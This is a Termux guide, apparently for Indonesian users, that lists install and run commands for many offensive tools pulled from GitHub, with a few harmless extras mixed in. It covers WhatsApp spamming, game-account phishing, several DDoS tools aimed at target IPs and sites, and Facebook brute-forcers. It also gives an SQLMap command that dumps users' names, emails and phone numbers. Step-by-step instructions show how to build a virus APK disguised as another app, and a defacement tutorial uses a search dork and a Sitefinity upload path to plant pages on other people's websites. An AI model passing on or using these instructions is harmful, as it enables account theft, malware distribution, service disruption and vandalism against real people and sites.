# Termux Hacking Tools

A collection of Termux commands for various hacking tools.

## Spam Chat WhatsApp

**Installation**

```bash
pkg update && pkg upgrade
pkg install python2
pkg install php
pkg install git
git clone https://github.com/siputra12/prank.git
```

**Usage**

```bash
cd prank
ls
php wa.php
```

## Phishing Game (Mobile Legends and Clash of Clans)

**Installation**

```bash
apt update
apt upgrade -y
pkg install python2 -y
pkg install apache2
pkg install php -y
pkg install git
git clone https://github.com/Senitopeng/PhisingGame
```

**Usage**

```bash
cd PhisingGame
python2 phising.py
```

## OSIF (Open Source Information Facebook)

**Installation**

```bash
pkg install python2
git clone https://github.com/ciku370/OSIF
cd OSIF
pip2 install -r requirements.txt
```

**Usage**

```bash
python2 osif.py
```

## WhatsApp Hack

**Installation**

```bash
pkg update && pkg upgrade
pkg install git
pkg install curl
git clone https://github.com/AndriGanz/whatshack
```

**Usage**

```bash
cd whatshack
ls
sh whatshack.sh
```

## D-tect

**Installation**

```bash
apt install git
apt install python2
git clone https://github.com/shawarkhanethicalhacker/D-TECT
```

**Usage**

```bash
cd D-TECH
chmod +x d-tect.py
python2 d-tect.py
```

## Create a Virus

**Usage**

```bash
cd /sdcard
cd vbug
ls
chmod vbug.py
chmod -v vbug.py
python2 vbug.py
```

## IRSSI

**Usage**

```bash
/connet irc.freenode.net
/nick w3wandroid
/join #modol
```

## DDOS Tools

### Hammer

**Installation**

```bash
pkg update
pkg upgrade
pkg install python
pkg install git
git clone https://github.com/cyweb/hammer
```

**Usage**

```bash
cd hammer
python hammer.py
python hammer.py -s [IP target] -p [port] -t 135
```

### Xerxes

**Installation**

```bash
apt install git
apt install clang
git clone https://github.com/zanyarjamal/xerxes
```

**Usage**

```bash
cd xerxes
clang xerxes.c -o xerxes
./xerxes (nama website) 80
```

### Torshammer

**Installation**

```bash
pkg update
pkg install git
apt install tor
pkg install python2
git clone https://github.com/dotfighter/torshammer.git
```

**Usage**

```bash
cd torshammer
python2 torshammer.py
```

### liteDDOS

**Installation**

```bash
apt update
apt upgrade
pkg install git
pkg install python2
git clone https://github.com/4L13199/LITEDDOS
```

**Usage**

```bash
cd LITEDDOS
python2 liteDDOS.py
```

## Fun with Termux

### Moon-Buggy

```bash
pkg install moon-buggy
moon-buggy
```

### Music in Termux

```bash
pkg install mpv
mpv/sdcard/lagu.mp3
```

### Browsing in Termux

```bash
pkg install w3m
w3m www.google.com
```

### Telephone in Termux

```bash
pkg install termux-api
termux-telephony-call nomornya
```

### Animated Train

```bash
pkg install sl
sl
```

### System Information

```bash
pkg install neofetch
neofetch
```

### ASCII Text

```bash
pkg install figlet
figlet masukin teksnya
```

### Listen to YouTube

```bash
pip install mps_youtube
pip install youtube_dl
apt install mpv
mpsyt
/judul lagu
```

## Create a Virus (Advanced)

**Tools**

*   APK Editor
*   vbug tool

**Steps**

1.  Download the vbug tool.
2.  Place the vbug tool file outside of any folder in your internal memory.
3.  Open Termux and run the following commands:

    ```bash
    cd /sdcard
    unzip vbug.zip
    cd vbug
    python2 vbug.py
    ```

4.  Enter `10`
5.  Enter `E`
6.  The virus application is now created.
7.  Open APK Editor.
8.  Click "Select an Apk File".
9.  Select the virus application you just created.
10. Click "full edit".
11. In the "app\_name" field, enter the name of the application you want to impersonate.
12. Click "files".
13. Click "res/drawable".
14. Replace the second logo with the logo of the application you want to impersonate (must be a .png file).
15. Check the second logo and click "replace".
16. Select the logo file you want to use.
17. Go back to the home screen.
18. To make the application look more realistic, you need to add weight to it.
19. Click the plus sign in the bottom left corner, select "file", and add any file (song, image, etc.) to add weight to the application.
20. Click "build".
21. Wait for the process to finish.

## Facebook Tools

### Auto Boot FB

**Installation**

```bash
git clone https://github.com/Senitopeng/BotFbBangDjon.git
```

**Usage**

```bash
cd BotFbBangDjon
python2 bangdjon.py
```

### Autoreaction Facebook

**Installation**

```bash
git clone https://github.com/tomiashari/fb-autoreaction.git
```

**Usage**

```bash
cd fb-autoreaction
python2 fb-autoreaction
```

### MBF (Mass Brute Force)

**Installation**

```bash
pkg update && pkg upgrade
pkg install python2
pip2 install mechanize
git clone https://github.com/pirmansx/mbf
```

**Usage**

```bash
cd mbf
python2 MBF.py
```

### Hack FB (Group)

**Installation**

```bash
apt update && apt upgrade
pkg install python2 git
pip2 install mechanize
git clone http://github.com/pirmansx/mbf
```

**Usage**

```bash
cd mbf
python2 MBF.py
```

### Hack FB (Targeted)

**Installation**

```bash
Apt update
Apt upgrade
Apt install python2
pip2 install urllib3 chardet certifi idna requests
apt install openssl curl
pkg install libcurl
ln /sdcard
cd /sdcard
```

**Usage**

```bash
python2 fbbrute.py
```

## Instagram Tools


### Instagram Follower & Like Bot

**Installation**

```bash
pkg update
pkg upgrade
pkg install python2
pkg install ruby
gem install lolcat
pkg install git
git clone https://github.com/Hanzelnutt/instabot
```

**Usage**

```bash
cd instabot
pip2 install -r requirements.txt
bash instabot
```


## Wi-Fi Hacking (Root Required)

**Installation**

```bash
apt update
apt upgrade
apt install git
git clone https://github.com/esc0rtd3w/wifi-hacker
```

**Usage**

```bash
cd wifi-hacker
chmod +x wifi-hacker.sh
./wifi-hacker.sh
```

## Other Tools

### xNOT\_FOUND

**Installation**

```bash
apt update && apt upgrade
pkg install git
pkg install gem
pkg install figlet
gem install lolcat
git clone https://github.com/hatakecnk/xNot_Found
```

**Usage**

```bash
cd xNot_Found
sh xNot_Found.sh
```

### Hack Gmail

**Installation**

```bash
apt-get update && apt-get upgrade
apt-get install git
apt-get install python python-pip python-setuptools
pip install scapy
git clone https://github.com/wifiphisher/wifiphisher.git
```

**Usage**

```bash
cd wifiphisher
python setup.py install
python wifiphisher
```

### Weather Forecast

**Usage**

```bash
curl http://wttr.in/(lokasi)
```

### Customize Termux Look

**Installation**

```bash
pkg update && pkg upgrade
pkg install ruby cowsay toilet figlet
pkg install neofetch
pkg install nano
gem install lolcat
```

**Usage**

```bash
cd ../usr/etc
nano bash.bashrc
cowsay -f eyes Cyber | lolcat
toilet -f standard Indonesia -F gay
neofetch
date | lolcat
```

### IPGeoLocation

**Installation**

```bash
Apt install python git
git clone https://github.com/maldevel/IPGeoLocation.git
```

**Usage**

```bash
cd IPGeoLocation
chmod +x ipgeoLocation.py
pip install -r requirements.txt
python ipgeolocation.py -m
python ipgeolocation.py -t http://www.google.com
python ipgeolocation.py -t IP
```

### RED\_HAWK

**Installation**

```bash
apt update
apt install git
git clone https://github.com/Tuhinshubhra/RED_HAWK
```

**Usage**

```bash
cd RED_HAWK
chmod +x rhawk.php
apt install php
php rhawk.php
```

### WebDAV

**Installation**

```bash
apt update && upgrade
apt install python2
pip2 install urllib3 chardet certifi idna requests
apt install openssl curl
pkg install libcurl
ln -s /sdcard
cd sdcard
mkdir webdav
cd webdav
```

### Tools-B4J1N64Nv5

**Installation**

```bash
pkg install update
pkg install git
pkg install toilet
pkg install figlet
pip2 install lolcat
git clone https://github.com/DarknessCyberTeam/B4J1N64Nv5
```

**Usage**

```bash
cd B4J1N64Nv5
sh B4J1N64N.sh
```

### Termux Ubuntu

**Installation**

```bash
apt update/pkg update
apt upgrade/pkg upgrade
pkg install git
pkg install proot
pkg install wget
git clone https://github.com/Neo-Oli/termux-ubuntu
```

**Usage**

```bash
cd termux-ubuntu
chmod +x ubuntu.sh
pip install -r requirements.txt
./ubuntu.sh
./start.sh
```

### XL Pry

**Installation**

```bash
pkg upgrade
pkg update
pkg install git
pkg install python
git clone https://github.com/albertoanggi/xl-py
```

**Usage**

```bash
pip install -r requirements.txt
chmod +x app.py
python/python2 app.py
```

### Admin Finder

**Installation**

```bash
apt update && apt upgrade
pkg install python2
pkg install git
git clone https://github.com/AdheBolo/AdminFinder
```

**Usage**

```bash
cd AdminFinder
chmod 777 AdminFinder.py
python2 AdminFinder.py
```

### Mr.Rv1.1

**Installation**

```bash
apt update && apt upgrade
pkg install git
pkg install gem
pkg install figlet
gem install lolcat
git clone https://github.com/Mr-R225/Mr.Rv1.1
```

**Usage**

```bash
cd Mr.Rv1.1
sh Mr.Rv1.1.sh
```

### 4wsectools

**Installation**

```bash
apt update && apt upgrade
apt install git
git clone https://github.com/aryanrtm/4wsectools
```

**Usage**

```bash
cd 4wsectools
chmod 777 tools
./tools
```

### FSociety

**Installation**

```bash
git clone https://github.com/manisso/fsociety
```

**Usage**

```bash
cd fsociety
./install.sh
python2 fsociety.py
```

### SQLMap

**Installation**

```bash
apt update
apt install python
apt install python2
apt install git
git clone https://github.com/sqlmapproject/sqlmap
```

**Usage**

```bash
cd sqlmap
python2 sqlmap.py
python2 sqlmap.py -u website --dbs -D acuart --tables -D acuart -T users --columns -D acuart -T users -C name,email,phone --dump
```

### Admin Panel Finder

**Installation**

```bash
pkg install git
git clone https://github.com/Techzindia/admin_penal
```

**Usage**

```bash
cd admin_penal
chmod +x admin_panel_finder.py
python2 admin_panel_finder.py
```

### Hakku

**Installation**

```bash
apt install python
apt install git
mkdir vasu
git clone https://github.com/4shadoww/hakkuframework
```

**Usage**

```bash
cd hakkuframework
chmod +x hakku
python hakku
show modules
use whois
show options
set target examplesite.com
run
```

### viSQL

**Installation**

```bash
apt update
apt install python2
apt install git
git clone https://github.com/blackvkng/viSQL
```

**Usage**

```bash
cd viSQL
python2 -m pip install -r requirements.txt
python2 viSQL.py
python2 viSQL.py -t http://www.bible-history.com
```

### Hash Buster

**Installation**

```bash
apt update
apt upgrade
apt install python2
apt install git
git clone https://github.com/UltimateHackers/Hash-Buster
```

**Usage**

```bash
cd Hash-Buster
python2 hash.py
```

### Hunner Framework

**Installation**

```bash
apt update
apt install python
apt install git -y
git clone https://github.com/b3-v3r/Hunner
```

**Usage**

```bash
cd Hunner
chmod 777 hunner.py
python hunner.py
```

### Lazymux

**Installation**

```bash
pkg update && upgrade
pkg install python2
pkg install git
git clone https://github.com/Gameye98/Lazymux
```

**Usage**

```bash
cd Lazymux
chmod +x lazymux.py
python2 lazymux.py
```

### Daijobu

**Installation**

```bash
apt upgrade && apt update
apt install php
apt install git
git clone https://github.com/alintamvanz/diejoubu
```

**Usage**

```bash
cd diejoubu
cd v1.2
php diejoubu.php
```

### ReconDog

**Installation**

```bash
apt update
apt install python python2
apt install git
git clone https://github.com/UltimateHackers/ReconDog
```

**Usage**

```bash
cd ReconDog
chmod +x dog.py
python2 dog.py
```

### Script-Deface Creator

**Installation**

```bash
apt update
apt upgrade
apt install git
apt install python2
git clone https://github.com/Ubaii/script-deface-creator
```

**Usage**

```bash
cd script-deface-creator
chmod +x create.py
python2 create.py
```

### Deface Tutorial

1.  Prepare your own script.
2.  Open your browser and search for the following dork: `inurl:"sitefinity/login.aspx"`
3.  Choose one of the websites and add the following exploit to the URL: `/sitefinity/usercontrols/dialog/documenteditordialog.aspx`
    *   Example: `http://sitetarget.org/sitefinity/usercontrols/dialogs/documenteditordialog.aspx`
4.  Click "Choose File" and select your deface script.
5.  Click the button below and wait for the upload to complete.
6.  Add `/files/yourscriptname.html` to the target URL and search.
    *   Example: `http://sitetarget.org/files/namascriptdefacekalian.html`
7.  Done!
